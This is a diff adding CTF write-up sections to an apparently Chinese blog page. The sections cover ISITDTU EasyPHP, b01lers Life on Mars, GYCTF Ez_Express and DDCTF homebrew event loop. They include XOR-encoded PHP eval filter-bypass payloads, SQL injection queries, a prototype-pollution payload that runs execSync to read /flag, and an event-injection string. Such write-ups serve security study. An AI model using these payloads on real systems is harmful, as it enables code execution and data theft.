@@ -358,6 +358,116 @@
 
 <p>观察一下只有后面六位数不同，我们可以进行爆破。</p>
 <p>使用burp进行爆破即可。</p>
+<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>又是easyphp，直接给了源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[&#x27;_&#x27;];</span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, $_) )</span><br><span class="line">    die(&#x27;rosé will not do it&#x27;);</span><br><span class="line"></span><br><span class="line">if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</span><br><span class="line">    die(&#x27;you are so close, omg&#x27;);</span><br><span class="line"></span><br><span class="line">eval($_);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很清楚，有个eval函数，我们要构造payload绕过正则匹配还有看似长度限制执行我们的想要的命令。</p>
+<p>先分析这两个是什么限制，第一个，正则绕过，可以通过这个<a target="_blank" rel="noopener" href="https://regex101.com/">网站</a>帮你分析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00- 0-9                       匹配\x00到空格(\x20)和0-9的数字</span><br><span class="line">&#x27;&quot;`$&amp;.,|[&#123;_defgops              匹配到这些字符</span><br><span class="line">\x7F                            匹配到DEL(\x7F)字符</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面那个看似长度限制，其实是限制使用不同的字母，不能超过0xd，就是最多只能使用13种的字符。</span><br></pre></td></tr></table></figure>
+
+<p>我们先试一下取反绕过，成功返回php信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p>php版本是7.3.5，再看看禁用的函数disable_functions，直接把我们常用的system和exec给禁用了，还有其他命令执行都给ban了，导致无法进行任意命令执行。open_basedir也被限制在了/var/www/html。但是我们可以使用scandir函数返回目录，由于返回的是数组，需要配合print_r使用或者var_dump函数，这里再补充一个可以返回目录的函数 glob函数。</p>
+<p>由于取反绕过无法通过第二个限制，我们后面将使用异或绕过，毕竟它的变化更多。可以用更多的替换。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">复习一下正则匹配绕过的姿势</a></p>
+<p>目标构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
+
+<p>超过了字符限制，我们缩减字符，脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total</span><br><span class="line">result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted</span><br><span class="line">temp = []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c == d):</span><br><span class="line">                    if a == b == c == d:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>
+
+<p>缩减后还剩，11种，还是不够。还能继续删除。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
+
+<p>返回目录后，我们要读取文件内容，可以使用show_source或者readfile，同时我们想要获得的文件在最后面，我们可以使用函数end获取文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158]  # Original chars,14 total</span><br><span class="line">result = [160, 136, 141, 209, 151, 154, 155, 156]</span><br><span class="line">temp = []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c == d):</span><br><span class="line">                    if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c):</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>先大致浏览一下前端，看看有没有什么提示，好像没有，一般不要一上来就扫目录，效率太低，然后我们抓包看一下，分别点这几个会发送什么给服务器。</p>
+<p>抓了几个看看就发现可以存在传参。</p>
+<p>通过search传参，有个query查询数据，感觉有点像sql注入，我们先试一下。</p>
+<p>开始尝试sql注入，多尝试就知道注入点在哪里了。</p>
+<p>成功判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin order by 2</span><br></pre></td></tr></table></figure>
+
+<p>注意前面的utopia_basin，不然只会返回1。</p>
+<p>数字型注入，爆出数据库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin union select 1,2</span><br></pre></td></tr></table></figure>
+
+<p>这题最坑的就是flag在另一个数据库里面，我们需要使用sqlmap爆出另外一个数据库alien_code</p>
+<p>然后再不断爆信息，最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin union select 1,group_concat(code)from alien_code.code</span><br></pre></td></tr></table></figure>
+
+<p>后面指定的是alien_code数据库中的表code。</p>
+<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>发现存在源码泄露，<a target="_blank" rel="noopener" href="http://www.zip,下载下来审计一下./">www.zip，下载下来审计一下。</a></p>
+<p>这里也不知道利用什么，看一下wp。</p>
+<p>考察<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">原型链污染</a>，之前还都没听说过，还是有很多需要学习。</p>
+<p>原型链的特性：</p>
+<p>在调用某一对象的属性时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.对象(obj)中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.__proto__中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure>
+
+<p>这样的机制被称为js的prototype继承链，与原型链污染密切相关。</p>
+<p>原型链污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</span><br></pre></td></tr></table></figure>
+
+<p>往往看见merge和clone函数就可以往原型链污染思考，跟进函数，寻找污染点。</p>
+<p>来自某师傅的总结</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总结下：</span><br><span class="line">1.原型链污染属于前端漏洞应用，基本上需要源码审计功力来进行解决；找到merge(),clone()只是确定漏洞的开始</span><br><span class="line">2.进行审计需要以达成RCE为主要目的。通常exec, return等等都是值得注意的关键字。</span><br><span class="line">3.题目基本是以弹shell为最终目的。目前来看很多Node.js传统弹shell方式并不适用.wget,curl,以及我两道题都用到的nc比较适用。</span><br></pre></td></tr></table></figure>
+
+<p>我们需要先绕过登录，不懂点js代码，还真看不懂这些，在index.js存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;user&#x27;:req.body.userid.toUpperCase()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">js大小写特性</a></p>
+<p><code>toUpperCase</code>就是将小写转化成大写的函数，这里就利用其中的漏洞，我们注册一个名为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın</span><br></pre></td></tr></table></figure>
+
+<p>的用户，因为要是admin用户才能使用clone函数。</p>
+<p>然后我们再登陆，就可以将</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın经过函数处理就变成ADMIN</span><br></pre></td></tr></table></figure>
+
+<p>寻找可以污染的参数，就是没有被定义的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这里的outputFunctionName就可以进行ssti注入，抓Action的包，然后修改为json类型。</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后访问/info即可下载得到flag。</p>
+<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>主要考python的代码审计，果然网安，什么都要懂一些。</p>
+<p>如何后面主要是逻辑漏洞，一般有购买的都挺多逻辑漏洞的，但是这种跟我们前面遇到的篡改数字是不一样的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_flag_handler(args):</span><br><span class="line">    if session[&#x27;num_items&#x27;] &gt;= 5:</span><br><span class="line">        # show_flag_function has been disabled, no worries</span><br><span class="line">        trigger_event(&#x27;func:show_flag;&#x27; + FLAG()</span><br><span class="line">    trigger_event(&#x27;action:view;index&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>我们想要获得flag就需要调用这个函数<code>get_flag_handler</code>。同时在<code>execute_event_loop</code>函数找到了<code>eval</code>这个函数，在函数看看要怎么利用构造我们想要的执行的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_action = event[0] == &#x27;a&#x27; </span><br><span class="line">action = get_mid_str(event, &#x27;:&#x27;, &#x27;;&#x27;) </span><br><span class="line">args = get_mid_str(event, action+&#x27;;&#x27;).split(&#x27;#&#x27;) </span><br></pre></td></tr></table></figure>
+
+<p> 看到<code>execute_event_loop</code>代码，这里通过#将命令分割，我们可以通过#进行多命令的执行，这样就可以执行我们想要执行的函数。</p>
+<p>传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23</span><br></pre></td></tr></table></figure>
+
+<p>同时这是flask处理的session，<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">我们通过脚本</a></p>
+<p>到kali虚拟机里，下载脚本，然后执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyNzU-LgkAYx_G3sjxnD9MMEQpegk2KHGnXGueJZdEMs2YmQe3PhO99vewh8ODtge_D5_cCdS3A2-9f8JGBB1Jwkgq3jfRqcozrJ3TOcLFDJVf5wtVZsDDR3feh-3H-XTS7VtrqnNGpzcVEJWx-S8WURHbpD0gGK0wOs_7jgkkxUgpHSu-QTQOXJRRrKQ4z1I8Tskah5mUovhR-kwc_L-k63jAebxspNk9ZEopidwntZ98KyoOVO24YTKt_y-aoa_CYA9W1NE1_ku4PAcl7jA.YPFNOw.HxuyEAnWbhDWtSmZafpROdM3eJI&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果对python不是很懂的，<a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyaowangchuan/article/details/110471985">想看看源代码分析可以参考这些师傅的</a></p>
+<p>同时也有一边关于flask session<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">安全的文章</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
